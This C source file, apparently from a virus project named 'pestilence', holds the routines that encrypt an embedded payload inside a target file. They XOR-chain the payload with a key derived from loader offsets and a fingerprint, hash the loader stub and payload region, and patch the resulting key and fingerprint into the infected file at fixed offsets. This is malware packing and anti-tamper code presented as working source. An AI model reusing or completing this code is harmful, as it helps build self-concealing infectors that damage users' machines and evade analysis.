#include "pestilence.h"

uint32_t    encrypt(t_info *info, void *ptr, size_t size, uint32_t fingerprint)
{
	uint32_t    *file;
	uint32_t    key;
	size_t      i;  
	uint32_t start = info->addr_bis + /*B*/0x10c/*B`*/;
	uint32_t end = (int32_t)(info->addr_bis + BIS_SIZE + MAIN_OFFSET);

	file = (uint32_t *)ptr;
	key = end - start; // key is now offset to jump payload from loader
	key += fingerprint;
	ft_memcpy(info->file + info->offset_bis + /*D*/0xFB/*D`*/, &fingerprint, 4); //0xfb is pos of fingerprint sub in bis
	int nb = 0;
	size = (size / 4 ) * 4;
	while (nb < 8)
	{   
		i = 0;
		while (i * 4 < size - 4)
		{   
			file[i] ^= key;
			key += file[i];
			i++;
		}   
		key -= SUB;
		nb++;
	}
	return (key);
}

uint32_t	hash_loader(t_info *info)
{
	uint32_t	hash = 5381;
	size_t		size;
	unsigned char	*str;
	size_t		i = 0;

	str = (unsigned char *)(info->text_begin + info->text_size);
	size = 0xc5; //a modifier taille du loader 0xc5 (0xca - 5)
	while (i < size)
	{
		if (i < 0x9D || i > 0xa1) //a modifier debut et fin pos adresse apres pos_rdi dans loader
			hash = ((hash << 5) + hash) + str[i];
		i++;
	}
	patch_loader(info, hash);
	str = (unsigned char *)(info->file + info->offset_bis);
	size = 0x29f0; // BIS _SIZE + PAYLOAD SIZE a modifier 0x1f4f
	i = 0;
	while (i < size)
	{
		if (i < 0x91 || i > 0x95) // modifier debut et fin pos adresse apres ... dans bis
			hash = ((hash << 5) + hash) + str[i];
		i++;
	}
	return (hash);
}

void		patch_key(t_info *info, uint32_t key)
{
	uint32_t val;
	uint32_t hash;

	hash = hash_loader(info);
	// Key in loader
	val = key - hash;
	ft_memcpy(info->file + info->offset_bis + /*C*/0x91/*C`*/, &val, 4); // 0x78 is addr of key in bis
}
